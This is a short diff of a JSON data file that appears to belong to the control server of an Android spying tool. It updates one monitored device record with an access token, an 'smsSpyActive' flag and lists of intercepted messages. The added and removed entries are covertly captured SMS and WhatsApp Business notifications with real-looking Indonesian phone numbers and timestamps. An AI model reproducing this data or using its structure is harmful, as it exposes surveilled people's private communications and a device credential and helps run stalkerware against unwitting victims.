@@ -311,7 +311,7 @@
     "deviceName": "HP-SAYANG-4049",
     "ownerUsername": "GANANG",
     "token": "a70009f8a5d81c6b767372cdc0d6c979",
-    "lastSeen": 1775635365957,
+    "lastSeen": 1775635393060,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-08T06:28:11.035Z",
@@ -327,6 +327,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "XL",
+        "content": "(XL) Kuota Area Bebas Puas kamu saat ini kurang dari 98.00MB. Cek kuota berkala di aplikasi myXL atau *808#. Info: xl.co.id/LC",
+        "time": "08/04 15:03",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1775635394978
+      },
       {
         "appName": "WA Business",
         "sender": "+62 898-7564-441",
@@ -4318,14 +4326,6 @@
         "time": "08/04 14:26",
         "pkg": "com.whatsapp.w4b",
         "receivedAt": 1775633187899
-      },
-      {
-        "appName": "WA Business",
-        "sender": "+62 856-2460-4911",
-        "content": "📡 Undangan admin saluran",
-        "time": "08/04 14:26",
-        "pkg": "com.whatsapp.w4b",
-        "receivedAt": 1775633187571
       }
     ],
     "galleryPhotos": [],
